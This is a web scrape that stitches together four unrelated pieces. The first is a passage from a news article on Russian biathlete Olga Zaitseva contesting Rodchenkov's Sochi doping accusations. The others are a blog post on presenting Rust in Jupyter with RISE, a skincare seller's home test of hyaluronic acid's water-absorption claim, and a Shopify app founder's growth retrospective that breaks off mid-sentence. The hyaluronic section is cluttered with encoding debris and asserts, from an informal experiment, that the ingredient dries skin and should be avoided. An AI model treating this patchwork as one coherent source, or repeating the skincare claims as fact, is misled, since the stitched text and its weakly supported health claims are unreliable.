<p>This includes events that allegedly took place in Sochi. What is known about them is largely attributable to the descriptions and records of a key witness: Grigory Rodchenkov, 61. The chemist headed Russia’s national anti-doping laboratory until 2015, when he moved to the United States. There, he shared his account of what allegedly happened in Sochi with the <em>New York Times</em>. In his version of events, the urine of Russian medal candidates contaminated with banned substances at the Winter Games were secretly swapped with clean urine, presumably with the help of Russia’s secret service, the FSB. Rodchenkov has led such an exuberant life that Netflix even made the two-hour documentary film "Icarus” about it.</p><p>WADA appointed a special investigator, and subsequent analyses of Russian urine samples from Sochi revealed indications of urine tampering. Ultimately, the IOC felt the circumstantial evidence was strong enough to sanction the athletes. In several affidavits, Rodchenkov provided the names of athletes who were allegedly doped in Sochi and presented lists of competitors who, he claimed, were provided with protection by the Sports Ministry. Three years ago, this led the IOC to sanction 43 athletes and remove them from the results lists of the Sochi Olympics.</p><p>Almost all of those cases were appealed, and 28 were successful in getting the decision overturned. The decisions to reverse the sanctions were made due to insufficient evidence. Three rulings are still pending - the one for Zaitseva and the other two biathletes.</p><p><strong>A "Made-Up Story”</strong></p><p>Zaitseva claims that Rodchenkov’s portrayal of events is a "made-up story.” In a video call from Moscow, she says she has never seen him in her life. So why does he mention her explicitly in documents, in one case even describing a meeting with her? "I have no explanation for all these lies,” Zaitseva says, "except that he must be crazy.”</p><p>Rodchenkov claims that Zaitseva doped using EPO, a blood booster, and that, like many Russian medal candidates, she was given what was called the "Duchess cocktail,” a mixture of three anabolic steroids.</p><p>"None of it is true," says Zaitseva.</p><p>Wolfgang Pichler also believes the story about "this cocktail is total rubbish.” The Bavarian is considered one of the world’s best biathlon coaches and known as a champion of doping-free sports. After German reunification, he campaigned against the German Ski Association accepting former East German coaches who had been suspected of involvement in the regime’s doping programs. In 2009, he also demanded the exclusion of Russian biathletes from the Olympic Games following doping revelations. Then he became Russia’s head coach in 2011, and later took over a five-person training group that included Zaitseva.</p>
</div>

<div>
<p>The main training center was set up in Pichler’s hometown of Ruhpolding. Most of the other training camps also took place in Europe. "We were almost entirely under WADA’s control,” Pichler says. He also took blood from his charges each day of training to determine stress limits. If one of his charges had doped, he says he would have noticed.</p><p>But what about the cocktail? "A pipe dream,” Pichler claims. The coach says he said the very same thing during a hearing in Lausanne, Switzerland.</p><p>Four doping samples were taken from Zaitseva at Sochi – three urine and one blood. During follow-up analyses, investigators argued that the salt concentration in a urine sample was too high.</p><p><strong>Natural Cause Could not Be Ruled Out</strong></p><p>But experts believed that wasn’t enough to suggest the sample had been tampered with. Two expert opinions, including one from a renowned New York institute, were submitted during the Lausanne proceedings. Both stated that a natural cause for Zaitseva's salt value could not be ruled out. Zaitseva says she has always had a high-sodium diet, with lots of smoked salmon and red caviar, which were also served at the cafeteria in the Olympic Village.</p><p>The IOC re-examined Zaitseva’s blood sample, with negative results. If Zaitseva had cheated, they ought to have found traces of EPO- or anabolic doping. Unlike the urine samples, the blood samples at the Olympics were never secretly swapped.</p><p>Rodchenkov's statements about Zaitseva reach beyond Sochi. He claims, for example, that the biathlete ended her career at the end of 2014 by order of the Sports Ministry, because her blood values hadn’t normalized. Zaitseva did in fact announce her resignation in January 2015. "I was pregnant,” she says, nothing else. Her second son was born that October.</p>

<p>The test results from another urine sample the IOC introduced as evidence in the proceedings against Zaitseva also fall into this context. The sample is from October 2014 and contains DNA from two people – Zatiseva’s and, it would later be revealed, from a man. The IOC investigators considered this to be further evidence of fraud.</p><p>Zaitseva says she was shocked when she found out about it. "How do you think it feels to have to tell your husband that male DNA was found in your urine? That story could have destroyed my family.” It took years to identify the foreign DNA. According to the forensic reports viewed by DER SPIEGEL, it came from Zaitseva’s husband. They say the couple likely had sex shortly before the doping test.</p><p><strong>"It’s Like Getting Accused of Murder”</strong></p><p>Zaitseva says yes, she was trying to get pregnant at the time. She says the proceedings destroyed her reputation. "It’s like getting accused of murder, even though you haven’t hurt anyone,” she says.</p><p>She fought back, along with the other biathletes who had been accused of doping, and filed a lawsuit against Rodchenkov in New York. Mikhail Prokhorov, a man as glamorous as he is influential, is covering some of the costs of the women’s suit. The Russian billionaire is the former president of the Russian Biathlon Association and was the owner of the Brooklyn Nets NBA basketball team, among others.</p><p>The proceedings in the New York case are currently in recess. Both sides have agreed to wait for the outcome of the CAS ruling. The Russian side is counting on a reversal of the sanctions in Lausanne, which they believe could shift the lawsuit …</p></div></div></div>

            <section>
                <div>
                    <p>I sometimes give talks at the <a href="https://oradeatechhub.ro/">local tech hub</a> in the city where I live. It's not a big community, but I enjoy giving talks and they often provide a necessary deadline and motivation to finish some projects. </p><p>Last week I gave a talk about Rust. Given that there are still some restrictions on how many people get be in one room, the physical audience was only 10 people, but there was a livestream as well. </p><p>Until now, I had used Google Slides for my presentation. For talks that don't have a lot of code, it works fine. But when you are presenting lots of code (such as a tutorial for a programming language), I found Slides to be lacking. If you paste in the code directly, you can't have syntax highlighting. You can paste in a screenshot, but then any later modifications to the slide mean retaking the screenshot and replacing it, so it's more work.</p><p>You can present in an IDE, but sometimes you want to have slides with normal text between pieces of code, where you explain some things. Switching between two apps can quickly get annoying. Also, it's hard to prepare just "bite-sized" content in an IDE, but that is needed so that the audience is focused only on what you are explaining right now. </p><p>So I decided to try something new for my intro to Rust presentation: I used Jupyter Notebook with a several extensions and I think it worked pretty well (except for a bug towards the end of the presentation). </p><p>For this I used the <a href="https://rise.readthedocs.io/en/stable/support.html">RISE extension</a>, which adds live slide show support to Jupyter, using <code>reveal.js</code>. Each cell can be either a new slide, a sub-slide (so to get to it you have to "navigate down", in reveal.js style), a fragment (so it shows up on the same slide, but on a subsequent click), or notes. You can write new code and run it even during slideshow mode, so it's very useful if someone in the audience has a question, you can quickly write down and execute code to answer them. RISE is simple to install:</p><pre><code>&gt; pip install RISE
</code></pre><p>Then I used a bunch of extenstions that are bundled together in the <code><a href="https://jupyter-contrib-nbextensions.readthedocs.io/en/latest/install.html">jupyter_contrib_nbextensions</a></code> package. By default, you have to enable and configure them by editing JSON files, but there is another plugin to add a dashboard for them, called <code><a href="https://github.com/Jupyter-contrib/jupyter_nbextensions_configurator">jupyter_nbextensions_configurator</a></code>. They can be installed with:</p><pre><code>&gt; pip install jupyter_contrib_nbextensions
&gt; jupyter contrib nbextension install --user
&gt; pip install jupyter_nbextensions_configurator
&gt; jupyter nbextensions_configurator enable --user</code></pre><p>You have to restart the Jupyter process and now you will see a new tab on the home page of the local Jupyter page, where you can enable and configure all the installed extensions. </p><figure><img src="https://rolisz.ro/content/images/2020/07/image.png"></figure><p>I used the "Hide input" extension. Most of my code was organized into two cells. One which didn't contain all the code, just a snippet on which I wanted to focus (for example, I made a small change to a previously defined function), and another one which could be run and showed output. The latter cell was hidden with this extension, so that only the output could be seen. </p><figure><div><div><p><img src="https://rolisz.ro/content/images/2020/07/hiddencell.png" width="3634" height="1657"></p><p><img src="https://rolisz.ro/content/images/2020/07/revealed_cell.png" width="2082" height="1657"></p></div></div><figcaption>Left: snippet cell and output of hidden cell in slide view. Right: snippet cell, revealed hidden cell and it's output in notebook view</figcaption></figure><p>Initially I also used the "Split cell" extension. This extension gives you a button which can make a cell to be half width. If two consecutive cells are half width, they align next to each other, making two columns. I wanted to use this to have code on the left column and explanations on the right column. This would have worked if the presentation was online only, because I wouldn't have had to zoom in too much. But because in the last week before the presentation we found out that it was allowed to hold the presentation in person (with 10 people in the audience) and I had to present on a projector and zoom in, I ended up removing all the split cells because the content wouldn't fit in any longer. </p><h2 id="making-rust-work-with-jupyter">Making Rust work with Jupyter</h2><p>All the above is generic and can be made to work with anything that works in Jupyter. To make Rust work in Jupyter you need a kernel for it. Some guys from Google have made one called <code><a href="https://github.com/google/evcxr/blob/master/evcxr_jupyter/README.md">evcxr_jupyter</a></code>. </p><p>It's fairly straightforward to install. On Windows you need to first install CMake and then you run:</p><pre><code>&gt; cargo install evcxr_jupyter
&gt; evcxr_jupyter --install</code></pre><p>After restarting the Jupyter process, you now have the option of using a Rust kernel. To include Cargo dependencies, you can insert the following into a cell:</p><pre><code>:dep reqwest = { version = "0.10", features = ["json", "blocking"] }</code></pre><p>This downloads <code>reqwest</code> , compiles it and makes it available for using in other cells. </p><p>The notebook for presentation that I gave can be found in <a href="https://github.com/rolisz/presentations/blob/master/Web%20crawler%20in%20Rust.ipynb">a Github repo</a> and the recording can be found <a href="https://www.youtube.com/watch?v=sLIFCsU_Z7E&amp;feature=youtu.be">here</a>. </p><p><em>I’m publishing this as part of <a href="https://100daystooffload.com/">100 Days To Offload</a> - Day 27.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
    <p>By Wendy Ouriel</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>




<p>How do you know if someone is a vegan, a runner, or bought a house in Malibu in 1970 for $15Â&nbsp;and it's now worth $40 million? Because they'll tell you. You can also count that if a skin care company uses hyaluronic acid they will tell you thatÂ&nbsp;it holds 1000x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>Well IÂ&nbsp;put that ad nauseam claim to the test. And I found that hyaluronic acid does not hold 1000x its weight in water. It doesn't hold 500x its weight in water, it doesn't even hold 100x its weight in water. I found that hyaluronic acid only holds about 10-50x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp;Â&nbsp;</p>






<p>PerhapsÂ&nbsp;more egregious than the thoroughly false claim, is that there is not a clear-cut way to determine how much hyaluronic acid actually absorbs, which is why I could only give a range of 10-50x in my results. Hyaluronic acid forms a gel when saturated, but there is not a subjective way to determine when that "gel" is fully saturated, and thus you cannot weigh the fully saturated gel to determine how much water was absorbed. I expected that I could filter the fully saturated gel from the water that wasn't absorbed, weigh it, and determine how much water was absorbed by the hyaluronic acid. I was not able to do that because the gel varied in thickness, or just changed the thickness of the water to such a slight degree it wasn't measurable.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>I used hyaluronic acid of varying sizes to determine if there was a variation in the absorbency based on theÂ&nbsp;mass of the molecule. Hyaluronic acid is measured in daltons. Daltons areÂ&nbsp;used to measure something very low in mass, on the atomic level. 1 dalton = 0.00000000000000000000000166054 grams.Â&nbsp; Â&nbsp; Â&nbsp;</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;Â&nbsp;</p>








<p>There was also a high degree of variation between the absorbency for hyaluronic acid depending on the molecular weight. High molecular weight, low molecular weight, and super low molecular weight had a similar absorbencies, butÂ&nbsp;ultra low molecular weight was barely able toÂ&nbsp;hold onto any water at all.Â&nbsp;</p>

<h4>Materials used in this experiment:</h4>

<p>Hyaluronic acid high molecular weight (HMW): 1.0-1.5 million daltons</p>
<p>Hyaluronic acid low molecular weight (HLW): 0.8-1.0 million daltons</p>
<p>Hyaluronic acid super low molecular weight (HSLMW): &lt;50,000 daltons</p>
<p>Hyaluronic acid ultra low molecular weight (HULMW): &lt;6,000 daltons</p>

<p>Distilled water</p>

<h4>Experimental methods and results</h4>
<p>The first part of the experiment, I went right to the claim that hyaluronic acid absorbs 1000x its weight in water. I weighed out 1g of HA for all molecular weights (HMW, HLW, HSLMW, HULMW) and placed this in 1000g of distilled water.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0202_large.JPG?v=1585939704" alt="">Â&nbsp;<img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0201_large.JPG?v=1585939693" alt=""></p>
<h6>Pictured here is 1g of HA and 1000g of water (quarter shown for scale). As you can see it is a bold claim to state that such a small amount of HA can absorb that much water. Experimentally, this would mean that the HA would turn the water into a thick gel when added. This did not happen.</h6>
<p>Â&nbsp;</p>
<p>I then let the mixture sit for two days to allow for total absorption to occur.</p>
<p>After two days the mixture looked no different than regular water. There was no discernible change in thickness. I filtered out the mixture to determine if any gel had formed, indicating absorption and no gel was obtained.</p>
<p>This means that hyaluronic acid did not absorb 1000x its weight in water. It did not even come close enough to that figure to be measured.</p>
<p>I repeated the above protocol for 500x HA's weight in water, 250x its weight in water and 100x its weight in water. At 100x its weight in water, there was some thickening of the water for HMW, HLW and HSLMW, but not for HULMW. These findings indicate that HA was beginning to show saturation, but this is 10x less than the claims of 1000.Â&nbsp;</p>
<p>When HMW, HLW and HSLMW was put in 50x its weight in water, a semi-thick gel (hair-gel consistency) formed. However, this was not how HA is supposed to look when fully saturated, indicating it was not able to fully absorb 50x its weight in water. Therefore I had to add less water to the mixture to determine HA's saturation point. It is also important to note that the gel thinned after day 2 and someÂ&nbsp; water precipitated to the top, indicating that some of what HA absorbed was later lost.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0194_large.JPG?v=1585939657" alt=""></p>
<h6>Gel pictured here formed at 50x weight in water, however the thinness of the gel indicated that HA was not able to fully absorb all of the water in its environment.Â&nbsp;</h6>
<p>The next step was to put HMW, HLW and HSLMW in 10x its weight in water. It was at this point that a fully saturated gel formed. This gel was dense, and had the properties of HA when fully saturated. It was only at this time that gel clumps were formed in the water, and could be decanted and weighed to determine how much HA was actually able to absorb.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0199_large.JPG?v=1585939670" alt=""></p>
<h6>This gel, obtained by putting HA in 10x its weight in water had the thickness consistent with fully saturated hyaluronic acid.Â&nbsp;</h6>
<p>Â&nbsp;</p>
<p>This experiment told me that hyaluronic acid does not hold 1000x its weight in water, but it also told me something far more important. This experiment told me that there isn't sound scientific protocol for determining how much water hyaluronic acid is capable of absorbing. There was a varying degree in the thickness of the gels depending on how much water was added, and there wasn't a point in any of the experiments where I could subjectively and definitively determine where hyaluronic acid was fully saturated. A gel only started to form around the 50x its weight point, and the gel seemed to be fully saturated only around the 10x its weight point. The problem here is that it is fully up to the researcher to give a ballpark estimate based on their own perception to determine how much of hyaluronic acids weight it is actually able to absorb in water. That means that the science behind hyaluronic acid's absorption claims is somewhat dubious.Â&nbsp;</p>
<p>At the end of the day, it does not really matter how much water hyaluronic acid can absorb, from a skin care standpoint, because it is an ingredient that should be avoided due to its drying effect. It doesn't absorb into the skin and plump it, so who cares if it can absorb 10x its weight or 1000x its weight. Its all meaningless.</p>
<p>But what does matter is that a claim that has been parroted by every skin care company who uses it is completely false. And whats worse is thatÂ&nbsp;unsubstantiated hearsay is being passed off as scientific, and is repeated so often people take it at face value without any further research. None of these companies did their own research to back up the claim. They just repeated it and deceived everyone. Nothing about that is scientific.Â&nbsp;</p>
<p>It is about time that the real science stands up.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>14 months ago, my co-founder <a href="https://twitter.com/sankalpjonna" target="_blank">Sankalp</a> and I set out to build a business that can sustain our livelihood while allowing us the freedom to live life on our terms. </p><p>When we started, we each had roughly 12 months of savings to survive on, assuming we made $0. Hence our minimum goal was to make $1,500/mo and the case where we would be celebrating with champagne was set to $3,000/mo.</p><p>We launched our app on April 24, 2019. The first paid plan was launched on June 4, 2019. Around the same time, we got <a href="https://www.preetamnath.com/blog/shopify-micro-saas-growth" target="_blank">featured by Shopify</a>. Here's a <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">link to the app</a> if you want to check it out.</p><p>14 months later, we grew past $25,000 in MRR while remaining a 2 person team.</p><figure id="w-node-e5ce9f7f0ba4-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004959a0b62d53946fd901_shopify%20earnings%20growth.png" alt=""></p><figcaption><em>Note:&nbsp;Earnings reflect after a 1 month delay</em></figcaption></figure><p>I’m so proud of what we have built here.</p><p>If life is a video game, and there’s 100 levels to it, I feel like we have finally crossed level 1.</p><p>Here's what we've been up to in the 14 months since launch:</p><ul role="list"><li>20,000 active merchants (users) on the app</li><li>1,500+ paying merchants (customers)</li><li>450,000 automated WhatsApp messages sent in June</li><li>2.2 million WhatsApp chat messages initiated in June</li><li>Highest rated 5.0 🌟 app for all things WhatsApp with 500+ reviews</li><li>Users from 50+ countries around the world</li></ul><figure id="w-node-0cd8870c808c-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f007ba5d6c3b3532b0aa784_paying%20customers%20countries.png" alt=""></p></figure><p>We did a lot of things right, but we also messed up here and there. I've tried to capture an honest and accurate account of our journey so far.</p><h2>11 key learnings and mistakes from our journey<br></h2><h3>1- Learning: Always keep moving the needle</h3><p>Running your own business and having 100% freedom and flexibility is a gift or a curse, depending on how you use it. It’s easy to get lost in building, polishing, bringing your ideas to life. But remember, the only things that matter are what move the needle. </p><p>For every decision related to your business, you should always run it through a set of questions that help you filter out whether your idea is aligned to your business goals.</p><ul role="list"><li>Does it help our app get more users</li><li>Does it help convert more users to paying customers</li><li>Does it help users derive more value and ROI from the app</li><li>Does it meaningfully improve user experience</li><li>Does it reduce our support ticket load</li><li>Does it have any unintended 2nd order consequences that can bite us later</li></ul><p>Ultimately, you want to keep making decisions that move the needle for your business - by bringing you more customers and revenue, or making it easier and less time consuming to run the business (if that’s one of your goals, it is for us).<br></p><h3>2- Learning: Help users realise value as soon as possible</h3><p>From our research, we learnt that Shopify merchants are mostly solopreneurs or teams of 2-10. They are always time and resource crunched.</p><p>We wanted to enable our users to start using the app with the least amount of setup time or steps. This reflects in in the user experience of the app. </p><p>For example, when a first time user enters their phone number and hits the “Save” button, at this time the user is looking to test our app and see if it fits their needs. We speed that up by&nbsp;automatically enabling the chat button on first save, along with the best default configuration for all chat button related settings.</p><figure id="w-node-4b9a52f7ced2-2f0d8df6"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/o3oeGyv-JJs"></iframe></p></figure><p>Another example, when a user wants to start sending automated messages, all they have to do is click on the “Enable” button. All the app’s default configuration is automatically applied and the user can start seeing value immediately.</p><figure id="w-node-4bee860d412d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a6e594ffa16384d47ca_automated-message-setup-1.png" alt=""></p></figure><figure id="w-node-8c9743f7a3e0-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a858d5f7ceaad74de97_automated-message-setup-2.png" alt=""></p></figure><h3>3- Learning: Care about your users, they can feel it</h3><p>Users are on a mission to achieve their goals. They typically need your help when there’s something that stops them from getting there.</p><p>From day 1, we were clear on providing the best possible support. Our users would be thrilled to see bug fixes deployed in 15 minutes, WhatsApp &amp; email replies in 5 minutes, and so on. We were fast, we were responsive.</p><p>This worked in our favour - users showered us with positive reviews which is how we managed 500+ reviews while staying 5.0 star rated.</p><figure id="w-node-f55f45993a1f-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004affbd3802acac60056d_superlemon%20whatsapp%20app%20shopify%20reviews.png" alt=""></p></figure><p>But customer support isn’t only about getting reviews. We’ve had users who prefer using our app instead of competitors because</p><p><strong>A-</strong> We reply quickly</p><p><strong>B-</strong> We proactively provide information beyond the immediate premise of the query</p><figure id="w-node-e499fce41f50-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f0065d67e883834a7802cc8_review-users-care.png" alt=""></p><figcaption><em>Your users can feel when you genuinely care about them</em></figcaption></figure><h3>4- Learning: Be smart about managing and reducing support ticket volume</h3><p>The downside of trying to be a customer support hero is, you only have finite hours in the day, and you don’t want to spend most of it replying to customers. </p><p>We took 3 specific initiatives to reduce support tickets.</p><p><strong>1- Embed FAQs within the product</strong></p><p>We found that users would have FAQs around specific features, and they wouldn’t really go to the help center and reference it. To them, it’s simpler to ask for help.</p><p>To solve this problem, we embedded FAQs inside the product itself. </p><p>Here are a few examples where we included the most commonly asked question beside the feature configuration. </p><figure id="w-node-1def5927520e-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004c97d6c3b3b5f30a4556_faq-inside-product-1.png" alt=""></p></figure><figure id="w-node-11706312cf8a-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca08216b9c33aaef853_faq-inside-product-2.png" alt=""></p></figure><figure id="w-node-9239f016ade1-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca87bc6f87761475470_faq-inside-product-3.png" alt=""></p></figure><p>The results were always immediately noticeable. Where we would get 10 questions a week about X, would drop to 1-2, thereby freeing us up from answering repetitive support questions.</p><p><strong>2- Fix repetitive bugs</strong></p><p>If a bug appears more than thrice in a span of days, the third time is when we go ahead and permanently fix it. Why thrice? That way we don’t overwhelm ourselves with trying to fix every single bug, but only the ones that appear repeatedly and take up support time.</p><p><strong>3- Remove WhatsApp chat support and go with Email only</strong></p><p>During initial days, we found it useful to let our users contact us on WhatsApp. It lead to tons of conversations which shaped our understanding of the user’s needs and how we can better solve them. </p><p>But having WhatsApp as a support channel had 3 issues:</p><p><strong>1-</strong> With time, we discovered that people find dropping a message on WhatsApp to be very low barrier. Which means they wouldn’t take a moment to look around, be patient enough to find out how the issue that they are about to describe has already been solved inside the app. It’s just easier to WhatsApp us.</p><p><strong>2-</strong> We also discovered that users had an unrealistic expectation of quick replies and quick resolutions on WhatsApp. Granted, we would be quick whenever possible. But if it’s 11pm at night and the user asks if a bug is fixed 10 minutes later, it can get a bit annoying.</p><p><strong>3-</strong> I started dreading picking up my phone, seeing it full of support tickets every morning.</p><p>To solve this, we removed the WhatsApp chat button from our own app, and replaced it with an Email support button instead. All 3 problems listed above got resolved to a great degree.</p><figure id="w-node-09f7b09a3b19-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d01e45cb8848d6cf0f7_Email%20support%20only.png" alt=""></p></figure><p>We also made numerous smaller tweaks to optimise our support flow. One of the tiny but powerful tweaks was to automatically populate the email subject line with the user’s Shopify store url. That made it so much faster for us to look up the specific user instead of a meaningless back and forth of “what’s your store url”.</p><figure id="w-node-280b459e613d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00533cbd380208b160157f_store%20url.jpg" alt=""></p></figure><p>Our efforts have paid off. Unless we’re building new features, we spend only about <strong>15-30 minutes per day</strong> on customer support.<br></p><h3>5- Learning: Say No, often</h3><p>Users ask for all sorts of functionality. It doesn’t mean you should build them. </p><p>Whenever we get feature requests, we add a card in our internal Notion board and judge the card against 3 factors</p><p><strong>1-</strong> how many times do we receive the same request</p><p><strong>2-</strong> does the feature align with the rest of our product</p><p><strong>3-</strong> does the feature add core value to the user</p><p>Many times, we found users requesting features that would save them the hassle of using another app. Now, if that functionality enhances the rest of our app, it’s the right feature to add. But if it doesn’t, then we politely decline.</p><figure id="w-node-2831ff295f9b-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00517014696c60a040b940_politely%20saying%20no.png" alt=""></p></figure><p>There are 2 types of responses we give to customers regarding feature requests:</p><p><strong>1-</strong> Tell them that this feature isn’t requested by other users that much, and since we are a small team with limited resources, we may not be prioritising this feature in the near future.</p><p><strong>2-</strong> Tell them that this feature is already part of our roadmap, and that we will reach out to them whenever it’s ready. I generally avoid giving timelines, to account for “life happens, plans change”.</p><p>This learning extends beyond just feature requests. </p><p>In the past year, we have received tons of business proposals, partnerships, integration requests, collaborative marketing invitations etc. Saying No allowed us to remain focused on what’s really important.<br></p><h3>6- Mistake: Optimise top of the funnel</h3><p>I was under the impression that during build phase, we shouldn’t focus too much on optimisation. After all, you don’t want to get busy squeezing another 10% when the potential is to 10x. </p><p>In most cases, I think I made the right call. One place I made the wrong call was the user onboarding flow.</p><p>Until March 2020, users would install the app and directly land on the chat settings page, which is the starting point of the user’s journey. We were getting a steady flow of 10-15 paid trials initiated per day. </p><p>Adding a step of friction before this would be counterintuitive, right? It couldn’t possibly increase trials, right?</p><p>Sigh. </p><p>When we added one screen which asked the user upfront whether they want to continue with the Free plan, or start a trial for the Paid plan, daily paid trials DOUBLED overnight, while trial-to-paid conversion rate remained steady at 50%. </p><figure id="w-node-c2d582bcc858-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d9fda26a209aa082a72_onboarding%20trial%20doubled.png" alt=""></p></figure><p>The experiment took us a day to build, and after a week we concluded what was clearly the winner.</p><p>I normally advocate for focusing on building vs optimising in the early stages, but in this case I didn’t know that optimisation was waiting to unlock 100% increase in trials.</p><p>My takeaway here is - always keep your eyes open for bottlenecks at the top of funnel. </p><p>If there’s copy on your website, or a specific sign up flow that might be holding you back from getting 2x the users, you need to unblock it early and realise compounded gains over time.<br></p><h3>7- Mistake: Competition will copy, don’t completely ignore them</h3><p>In the past year, we’ve seen competitors copy our app interface, in-app descriptions, button designs, app listing text word-for-word in many cases. Initially we were furious, but instead we kept our head down and focused on customer’s needs. </p><p>Eventually we started ignoring our competitors, which was a mistake. While …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
